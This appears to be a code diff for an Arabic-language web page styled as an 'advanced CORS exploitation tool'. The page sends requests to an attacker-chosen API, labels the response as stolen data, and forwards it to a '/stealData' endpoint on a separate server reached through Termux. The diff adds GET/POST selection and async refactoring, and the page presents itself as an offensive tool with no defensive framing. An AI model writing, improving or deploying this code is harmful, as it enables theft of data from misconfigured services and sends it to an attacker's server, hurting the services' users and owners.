@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>استغلال ثغرة CORS</title>
+    <title>أداة استغلال CORS المتطورة</title>
     <style>
         /* تنسيق الصفحة */
         body {
@@ -24,7 +24,7 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
             width: 100%;
-            max-width: 500px;
+            max-width: 600px;
         }
 
         h1 {
@@ -36,7 +36,7 @@
             margin-bottom: 20px;
         }
 
-        input {
+        input, select {
             width: 80%;
             padding: 10px;
             font-size: 16px;
@@ -83,9 +83,13 @@
 </head>
 <body>
     <div class="container">
-        <h1>أداة استغلال ثغرة CORS</h1>
+        <h1>أداة استغلال ثغرة CORS المتطورة</h1>
         <div class="form-container">
             <input type="text" id="targetUrl" placeholder="أدخل رابط الـ API المستهدف" />
+            <select id="httpMethod">
+                <option value="GET">GET</option>
+                <option value="POST">POST</option>
+            </select>
             <button onclick="exploitCORS()">استغلال الثغرة</button>
         </div>
         <div id="status" class="status"></div>
@@ -93,73 +97,90 @@
     </div>
 
     <script>
-        // دالة استغلال ثغرة CORS
-        function exploitCORS() {
-            const targetUrl = document.getElementById('targetUrl').value.trim(); // الحصول على الرابط المدخل
+        // استخدام async/await لتحسين السرعة والكفاءة
+        async function exploitCORS() {
+            const targetUrl = document.getElementById('targetUrl').value.trim();
+            const httpMethod = document.getElementById('httpMethod').value;
             const statusElement = document.getElementById('status');
             const resultElement = document.getElementById('result');
 
-            // التحقق من صحة الرابط المدخل
             if (!targetUrl) {
                 statusElement.textContent = "يرجى إدخال رابط الـ API.";
                 statusElement.style.color = 'red';
                 return;
             }
 
-            // عرض حالة التحميل
+            // تحديث الحالة
             statusElement.textContent = "جاري فحص الثغرة...";
             statusElement.style.color = 'blue';
 
-            // إجراء الطلب
-            fetch(targetUrl, {
-                method: "GET",
+            // إعدادات الطلب بناءً على نوع الطلب (GET أو POST)
+            const fetchOptions = {
+                method: httpMethod,
                 headers: {
                     'X-Custom-Header': 'SomeValue'
                 }
-            })
-            .then(response => {
-                const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
+            };
 
-                // التحقق من CORS misconfiguration
+            // إذا كان الطلب POST، نضيف بيانات JSON في الـ body
+            if (httpMethod === 'POST') {
+                fetchOptions.body = JSON.stringify({ key: 'value' });
+                fetchOptions.headers['Content-Type'] = 'application/json';
+            }
+
+            try {
+                // إرسال الطلب
+                const response = await fetch(targetUrl, fetchOptions);
+                const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
+                const allowMethods = response.headers.get('Access-Control-Allow-Methods');
+                const allowHeaders = response.headers.get('Access-Control-Allow-Headers');
+
                 if (allowOrigin === '*' || allowOrigin.includes(window.location.origin)) {
-                    console.log("CORS misconfiguration detected");
-                    statusElement.textContent = "تم اكتشاف ثغرة CORS!";
-                    statusElement.style.color = 'green';
-                    return response.text();
+                    // التحقق من CORS Misconfiguration
+                    if (allowMethods && allowHeaders) {
+                        statusElement.textContent = `تم اكتشاف ثغرة CORS! السماح بالطرق: ${allowMethods}, الرؤوس: ${allowHeaders}`;
+                        statusElement.style.color = 'green';
+                    } else {
+                        statusElement.textContent = "تم اكتشاف ثغرة CORS ولكن بدون دعم كافٍ للرؤوس أو الطرق.";
+                        statusElement.style.color = 'orange';
+                    }
+
+                    // جلب البيانات المسروقة
+                    const data = await response.text();
+                    resultElement.style.display = 'block';
+                    resultElement.innerHTML = `
+                        <h3>البيانات المسروقة:</h3>
+                        <pre>${data}</pre>
+                    `;
+
+                    // إرسال البيانات المسروقة إلى الخادم عبر Termux
+                    await sendStolenData(data);
                 } else {
-                    console.log("No CORS misconfiguration found");
                     statusElement.textContent = "لم يتم العثور على ثغرة CORS.";
                     statusElement.style.color = 'red';
-                    throw new Error("CORS misconfiguration not found");
                 }
-            })
-            .then(data => {
-                // عرض البيانات المسروقة
-                resultElement.style.display = 'block';
-                resultElement.innerHTML = `
-                    <h3>البيانات المسروقة:</h3>
-                    <pre>${data}</pre>
-                `;
+            } catch (error) {
+                statusElement.textContent = "حدث خطأ أثناء الفحص.";
+                statusElement.style.color = 'red';
+                console.error('Error:', error);
+            }
+        }
 
-                // إرسال البيانات إلى الخادم عبر Termux
-                fetch('http://10.2.0.2:3000/stealData', {
+        // إرسال البيانات المسروقة إلى الخادم عبر Termux
+        async function sendStolenData(data) {
+            try {
+                const response = await fetch('http://10.2.0.2:3000/stealData', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({ stolenData: data })
-                })
-                .then(response => response.json())
-                .then(result => {
-                    console.log("Data sent successfully", result);
-                })
-                .catch(error => {
-                    console.error("Error sending stolen data:", error);
                 });
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+                const result = await response.json();
+                console.log("Data sent successfully", result);
+            } catch (error) {
+                console.error("Error sending stolen data:", error);
+            }
         }
     </script>
 </body>
